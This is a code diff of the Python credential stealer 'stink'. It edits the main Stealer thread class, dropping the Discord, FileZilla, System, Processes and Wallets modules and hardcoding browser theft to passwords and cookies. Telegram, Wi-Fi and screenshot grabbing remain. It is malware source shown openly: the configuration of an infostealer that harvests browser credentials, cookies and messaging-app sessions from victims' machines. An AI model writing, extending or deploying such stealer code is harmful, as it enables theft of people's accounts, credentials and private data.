@@ -10,13 +10,8 @@ from stink.helpers.config import MultistealerConfig, Browsers
 from stink.utils import Message, Protector, Loader, Grabber
 from stink.modules import (
     Chromium,
-    Discord,
-    FileZilla,
-    Processes,
     Screenshot,
-    System,
     Telegram,
-    Wallets,
     Wifi,
 )
 
@@ -27,13 +22,13 @@ class Stealer(Thread):
     """
 
     def __init__(
-        self,
-        features: List[Features] = None,
-        utils: List[Utils] = None,
-        loaders: List[Loader] = None,
-        protectors: List[Protectors] = None,
-        grabbers: List[Grabber] = None,
-        delay: int = 0,
+            self,
+            features: List[Features] = None,
+            utils: List[Utils] = None,
+            loaders: List[Loader] = None,
+            protectors: List[Protectors] = None,
+            grabbers: List[Grabber] = None,
+            delay: int = 0,
     ):
         Thread.__init__(self, name="Stealer")
 
@@ -65,17 +60,8 @@ class Stealer(Thread):
         self.__storage = MemoryStorage()
 
         browser_functions = [
-            module
-            for module in [
-                Features.passwords,
-                Features.cookies,
-                Features.cards,
-                Features.history,
-                Features.bookmarks,
-                Features.extensions,
-                Features.wallets,
-            ]
-            if module in features or Features.all in features
+            Features.passwords,
+            Features.cookies,
         ]
         browser_statuses = len(browser_functions) > 0
 
@@ -151,16 +137,6 @@ class Stealer(Thread):
                 "status": browser_statuses,
             },
             {
-                "object": System,
-                "arguments": ("System",),
-                "status": Features.system in features or Features.all in features,
-            },
-            {
-                "object": Processes,
-                "arguments": ("System",),
-                "status": Features.processes in features or Features.all in features,
-            },
-            {
                 "object": Wifi,
                 "arguments": ("System",),
                 "status": Features.wifi in features or Features.all in features,
@@ -171,25 +147,10 @@ class Stealer(Thread):
                 "status": Features.screenshot in features or Features.all in features,
             },
             {
-                "object": Discord,
-                "arguments": ("Programs/Discord",),
-                "status": Features.discord in features or Features.all in features,
-            },
-            {
                 "object": Telegram,
                 "arguments": ("Programs/Telegram",),
                 "status": Features.telegram in features or Features.all in features,
-            },
-            {
-                "object": FileZilla,
-                "arguments": ("Programs/FileZilla",),
-                "status": Features.filezilla in features or Features.all in features,
-            },
-            {
-                "object": Wallets,
-                "arguments": ("Wallets",),
-                "status": Features.wallets in features or Features.all in features,
-            },
+            }
         ]
 
     def run(self) -> None:
